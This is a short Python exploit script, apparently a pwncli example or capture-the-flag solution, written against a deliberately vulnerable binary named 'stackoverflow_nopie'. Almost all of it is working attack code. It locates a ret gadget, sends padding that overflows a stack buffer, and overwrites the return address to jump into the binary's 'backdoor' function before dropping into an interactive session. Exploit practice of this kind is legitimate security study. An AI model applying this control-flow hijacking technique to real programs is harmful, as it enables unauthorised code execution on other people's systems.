#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick
# python3 exp.py de ./stackoverflow_nopie

from pwncli import *

# use script mode
cli_script()

# get use for obj from gift
io: tube = gift['io'] 
elf: ELF = gift['elf']
libc: ELF = gift['libc']

# get gadgets from current file
log_ex("Use CurrentGadgets API.")
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=True)
ret = CurrentGadgets.ret()

log_ex("To send name.")
io.sendafter("read your name: ", "roderick")
stop(0)
msg = rl().decode()
log_ex("Msg recv: %r" % msg)

# to execute backdoor
log_ex("To execute backdoor.")
io.sendafter("please input: ", b"a"*0x18 + p64(ret) + p64(elf.sym.backdoor))

ia()
